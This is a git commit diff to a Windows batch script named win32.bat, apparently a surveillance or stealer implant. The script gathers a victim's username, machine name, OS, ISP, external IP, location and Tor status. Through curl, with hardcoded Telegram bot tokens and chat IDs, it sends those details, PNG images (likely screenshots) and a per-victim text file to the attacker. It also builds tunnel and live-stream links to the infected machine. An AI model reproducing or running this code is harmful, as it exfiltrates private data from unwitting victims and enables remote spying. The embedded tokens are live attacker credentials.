376737dc2191daeb1b70828a5ea32055c0e528bf
cryptedodissey <90626486+cryptedodissey@users.noreply.github.com>
2023-07-13 12:51:28 +0200

    Update win32.bat

--- win32.bat
+++ win32.bat
@@ -57,19 +57,19 @@ for /f "tokens=1* delims=:" %%A in (
 
 if exist "%temp%\localtunnel.txt" (
    for /f "tokens=3* delims=:" %%a in (' %temp%\localtunnel.txt') do (
-  set URI=%%b)
+  set URI=%%b && set WS=%URI:~0,-1%)
 ) else (
    set "LocalTunnel=N/A"
 )
 setlocal enableDelayedExpansion
 set temporary=%temp%
-for %%f IN (%temporary:~3%) DO (
+for %%f IN (%temporary:~3%/playlist.m3u8) DO (
   set oldtemp=%%f
   set newtemp=!oldtemp:\=/!    
-  set livestream=%URI:~0,-1%!newtemp!/playlist.m3u8
+  set livestream=%URI:~0,-1%!newtemp!
 )
 
-"%environment%\curl.exe" -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%URI:~0,-1%] [Live Stream: %livestream% ] " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574
+"%environment%\curl.exe" -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS%] [Live Stream: %livestream% ] " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574
 for %%# in ("*.png") do "%environment%\curl.exe" -k %proxy% -F document=@"%%~f#" https://api.telegram.org/bot6053961003:AAENR1HtCpNA7AJaWN1LUnPXxuEsoogKBG8/sendDocument?chat_id=-1001930176759 
 "%environment%\curl.exe" -k %proxy% -F document=@"%username%@%computername%.txt" https://api.telegram.org/bot6330710820:AAFCaGDiYMvQ2SJxcMbvP6D2_tCFS9NtBzo/sendDocument?chat_id=-932893443 
 setlocal disableDelayedExpansion
